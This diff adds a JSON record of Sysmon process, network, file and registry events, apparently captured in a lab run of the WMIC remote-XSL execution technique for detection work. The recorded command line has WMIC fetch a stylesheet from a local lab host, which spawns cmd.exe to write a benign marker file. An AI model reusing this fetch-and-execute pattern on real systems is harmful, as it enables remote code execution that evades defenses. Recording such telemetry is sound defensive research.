@@ -1,0 +1,80 @@
+{
+  "source": {
+    "collector": "C:\\Tools\\collect-run.ps1",
+    "window_start": "2026-08-10T01:46:07.331Z",
+    "window_end": "2026-08-10T01:46:14.378Z",
+    "event_count_all_channels": 1217,
+    "sysmon_event_count": 1108,
+    "raw_events_json_sha256": "50A4A761305C492200A0337417FD49AFFEEC65A506AE1288C912073D45CFC789",
+    "raw_sysmon_evtx_sha256": "BBF934FE97228CF6B83B3D3D31213DC4F3F6E2B915E7B27E727EC0730C350FFF"
+  },
+  "process": {
+    "event_id": 1,
+    "utc_time": "2026-08-10T01:46:10.348Z",
+    "process_guid": "{d6daef74-2d62-6a79-9400-000000000b00}",
+    "process_id": 5224,
+    "image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
+    "original_file_name": "wmic.exe",
+    "file_version": "10.0.19041.5794 (WinBuild.160101.0800)",
+    "company": "Microsoft Corporation",
+    "command_line": "\"C:\\Windows\\System32\\wbem\\WMIC.exe\" os get Caption /format:\"http://192.168.1.50:18082/benign.xsl\"",
+    "user": "NT AUTHORITY\\SYSTEM",
+    "integrity_level": "System",
+    "sha256": "DA603FA720AB43AA6D4D36AA9FDB828DAB9645523EABAAC209AF6451D5B4D757"
+  },
+  "parent_child": {
+    "launcher": {
+      "parent_image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "child_image": "C:\\Windows\\System32\\wbem\\WMIC.exe"
+    },
+    "xsl_children": {
+      "count": 2,
+      "image": "C:\\Windows\\System32\\cmd.exe",
+      "command_line": "\"C:\\Windows\\System32\\cmd.exe\" /c echo benign-wmic-xsl-marker>C:\\lab\\wmic-xsl-marker.txt",
+      "parent_image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
+      "parent_command_line": "\"C:\\Windows\\System32\\wbem\\WMIC.exe\" os get Caption /format:\"http://192.168.1.50:18082/benign.xsl\""
+    }
+  },
+  "network": {
+    "event_id_3_count": 1,
+    "event_id_22_count": 0,
+    "dns_assessment": "No DNS query was expected or observed because the URL used an IP literal.",
+    "connection": {
+      "utc_time": "2026-08-10T01:46:10.431Z",
+      "image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
+      "protocol": "tcp",
+      "initiated": true,
+      "source_ip": "192.168.1.52",
+      "source_port": 49678,
+      "destination_ip": "192.168.1.50",
+      "destination_port": 18082
+    }
+  },
+  "files": {
+    "event_id_11_relevant_count": 3,
+    "event_id_23_relevant_count": 1,
+    "events": [
+      {
+        "image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
+        "target_filename": "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\benign[1].xsl"
+      },
+      {
+        "image": "C:\\Windows\\System32\\cmd.exe",
+        "target_filename": "C:\\lab\\wmic-xsl-marker.txt",
+        "create_count": 2,
+        "overwrite_delete_count": 1
+      }
+    ]
+  },
+  "registry": {
+    "event_id_12_relevant_count": 15,
+    "event_id_13_relevant_count": 13,
+    "event_id_14_relevant_count": 0,
+    "representative_targets": [
+      "HKU\\.DEFAULT\\Software\\Microsoft\\Windows Script\\Settings\\Telemetry\\wmic.exe",
+      "HKU\\.DEFAULT\\Software\\Microsoft\\Windows Script\\Settings\\Telemetry\\wmic.exe\\JScriptSetScriptStateStarted",
+      "HKLM\\SOFTWARE\\Microsoft\\Wbem\\CIMOM"
+    ],
+    "assessment": "The JScript telemetry value paired with wmic.exe is distinctive supporting evidence. WMI, Internet Settings, and notification writes are normal initialization state and are not used alone."
+  }
+}
